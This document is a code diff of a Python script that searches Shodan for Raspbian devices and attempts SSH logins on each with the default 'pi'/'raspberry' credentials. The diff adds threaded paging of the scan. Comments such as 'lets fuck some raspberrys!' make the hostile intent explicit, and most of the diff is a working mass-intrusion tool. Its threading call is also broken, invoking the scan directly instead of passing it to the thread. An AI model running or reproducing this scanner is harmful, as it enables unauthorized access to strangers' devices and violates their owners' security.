@@ -11,7 +11,7 @@ import os
 # this is 2018 motherfucker!
 import threading
 
-DEBUG = TRUE
+DEBUG = True
 
 def te_rajo():
     print('''\t\t\t
@@ -41,31 +41,47 @@ def ssh_connect(hostname, port='22', username='pi', password='raspberry'):
     finally:
         client.close()
 
+
+def scan_job(shodan_api, page):
+    results = shodan_api.search('raspbian', page=page)
+    list_to_scan = []
+    for i in results['matches']:
+        if DEBUG:
+            print(threading.currentThread().getName() + ' IP: %s' % i['ip_str'])
+        list_to_scan.append(i['ip_str'])
+    # lets fuck some raspberrys!
+    # ssh connect
+    for hostname in list_to_scan:
+        ssh_connect(hostname)
+
+
 def main():
 
-    ShodanKeyString = open('shodankey').readline().rstrip('\n')
-    ShodanApi = shodan.Shodan(ShodanKeyString)
+    shodan_key = open('shodankey').readline().rstrip('\n')
+    shodan_api = shodan.Shodan(shodan_key)
     te_rajo()
     try:
-        results = ShodanApi.search('raspbian')
+        results = shodan_api.search('raspbian')
         pages = int(int(results['total']) / 100)
         print('Results: %s' % results['total'])
         # lets split this load in threads, because this is 2018
         threads = 8 # this is a lot? i dont know
-        list_to_scan = []
-        for i in results['matches']:
-            if debug:
-                print('IP: %s' % i['ip_str'])
-            # lets fuck some raspberrys!
-            # ssh connect
-            ssh_connect(i['ip_str'])
-        for i in range(2, pages):
-            results = ShodanApi.search('raspbian', page=i)
-            for i in results['matches']:
-                print('IP: %s' % i['ip_str'])
-                # lets fuck some raspberrys!
-                # ssh connect
-                ssh_connect(i['ip_str'])
+        jobs = []
+        page = 0
+        while page < pages:
+            for i in range(0, threads):
+                thread = threading.Thread(target=scan_job(shodan_api, page))
+                jobs.append(thread)
+                print(str(page))
+                page += 1
+            # start the threads
+            for j in jobs:
+                print('start')
+                j.start()
+            # ensure all of the threads have finished
+            for j in jobs:
+                j.join()
+            jobs.clear() # clear thread list
     except shodan.APIError as e:
         print('Ups... Something has gone wrong: %s' % e)
 
